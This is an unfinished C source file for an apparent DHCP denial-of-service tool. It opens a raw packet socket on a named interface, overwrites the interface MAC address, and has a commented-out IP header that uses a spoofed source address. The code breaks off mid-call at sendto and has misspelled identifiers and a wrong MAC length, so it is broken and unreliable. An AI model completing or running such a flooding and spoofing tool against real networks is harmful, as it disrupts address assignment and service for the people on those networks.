/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>

#define ARPHRD_ETHER 	1
#define PACKETMAXSIZE	512
unsigned short checksum(void* addr,int count);



int main(int argc,char **argv){

	if(argc!=2){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface>");
		exit(-1);
	}

	int sd;
	if((sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("socket()");
		exit(-1);
	}
	
////////////////////////Modify the mac address of the interface provided.
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,argv[1],IFNAMSIZ);

	//get hwaddr of the interface
	if(ioctl(sd, SIOCGIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCGIFHADDR)");	
		exit(-1);
	}

	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}
	//get interface index
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocal=htons(ETH_P_IP);
	if(bind(sd,(struct sockaddr*)&ifaddr,sizeof(struct sockaddr_ll))<0){
		perror("bind()");
		exit(-1);
	}

	
#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<8;iii++){
		printf(":%02x",(unsigned char)itface.ifr_hwaddr.sa_data[iii]);

	}
	printf("\n");
#endif
	//modify mac address
	for(int iii=0;iii<8;iii++){
		itface.ifr_hwaddr.sa_data[iii]=iii;

	}
	if(ioctl(sd, SIOCSIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCGIFHADDR)");	
		exit(-1);
	}
#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<8;iii++){
		printf(":%02x",(unsigned char)itface.ifr_hwaddr.sa_data[iii]);

	}
	printf("\n");
#endif
	unsigned char packet[PACKETMAXSIE];
	struct ether_header *etherhdr=(struct ether_header*)packet;
	

/*
	ip->iph_ihl = 5;
	ip->iph_ver = 4;
	ip->iph_tos = 0; // Low delay
	ip->iph_len = 64;
	ip->iph_ident = 54321;
	ip->iph_ttl = 64; // hops
	ip->iph_protocol = (unsigned char)1; // UDP
	// Source IP address, can use spoofed address here!!!
	inet_pton(AF_INET,"10.129.234.200",&(ip->iph_sourceip));
	// The destination IP address
	ip->iph_destip = (sinp->sin_addr).s_addr;
	ip->iph_chksum=checksum(ip,20);

*/

	if(sendto(sd,





}

unsigned short checksum(void* addr,int count){
           /* Compute Internet Checksum for "count" bytes
            *         beginning at location "addr".
            */
       register long sum = 0;

        while( count > 1 )  {
           /*  This is the inner loop */
               sum += * (unsigned short*) addr;
			   addr+=2;
               count -= 2;
       }

           /*  Add left-over byte, if any */
       if( count > 0 )
               sum += * (unsigned char *) addr;

           /*  Fold 32-bit sum to 16 bits */
       while (sum>>16)
           sum = (sum & 0xffff) + (sum >> 16);

       return (unsigned short)~sum;
	  
}

